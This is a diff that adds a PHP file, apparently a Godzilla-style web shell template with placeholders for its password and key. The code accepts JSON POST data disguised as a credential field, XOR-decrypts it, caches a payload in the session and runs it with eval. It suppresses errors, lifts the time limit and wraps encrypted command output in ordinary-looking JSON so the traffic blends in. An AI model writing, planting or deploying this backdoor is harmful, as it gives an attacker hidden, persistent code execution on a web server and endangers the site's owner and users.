@@ -1,0 +1,78 @@
+<?php
+header("Content-type:application/json");  // 设置响应为 JSON 格式
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+
+// 加密函数
+function encode($D, $K) {
+    for ($i = 0; $i < strlen($D); $i++) {
+        $c = $K[$i + 1 & 15];
+        $D[$i] = $D[$i] ^ $c;
+    }
+    return $D;
+}
+
+// 设置密钥和密码字段
+$pass = '{pass}';
+$payloadName = 'payload';
+$key = '{secretKey}';
+
+// 接收 JSON 格式的 POST 数据
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $inputData = json_decode(file_get_contents("php://input"), true);  // 获取 JSON 数据并转换为数组
+
+    // 如果数据格式正确，继续处理
+    if (isset($inputData['data']['credential'])) {
+        $data = $inputData['data']['credential'];
+        $str_pass = "DlMRWA1cL1gOVDc2MjRhR" . $pass . "=";
+
+        // 解码数据
+        $data = substr($data, strlen($str_pass));
+        $data = encode(base64_decode(urldecode($data)), $key);
+
+        // 检查 session 中的 payload
+        if (isset($_SESSION[$payloadName])) {
+            $payload = encode($_SESSION[$payloadName], $key);
+
+            // 进行 payload 解码
+            if (strpos($payload, "getBasicsInfo") === false) {
+                $payload = encode($payload, $key);
+            }
+
+            // 执行 payload
+            try {
+                eval($payload);
+            } catch (Exception $e) {
+                // 如果执行失败，返回错误
+                echo json_encode(array("status" => "false", "error" => "Payload execution failed"));
+                exit;
+            }
+
+            // 生成返回结果
+            $result = substr(md5($pass . $key), 0, 16);
+            $result .= base64_encode(encode(@run($data), $key));  // 加密后返回
+            $result .= substr(md5($pass . $key), 16);  // 后缀
+
+        } else {
+            if (strpos($data, "getBasicsInfo") !== false) {
+                $_SESSION[$payloadName] = encode($data, $key);
+            }
+        }
+
+        // 返回 JSON 格式的响应数据
+        $json_result = array();
+        $json_result["status"] = "true";
+        $json_result["data"] = array();
+        $json_result["data"]["enc"] = isset($result) ? $result : "null";  // 如果 result 为空，返回 "null"
+
+        // 输出 JSON 数据
+        echo json_encode($json_result);
+
+    } else {
+        // 如果数据格式不正确，返回错误信息
+        echo json_encode(array("status" => "false", "error" => "Invalid data format"));
+        exit;
+    }
+}
+?>
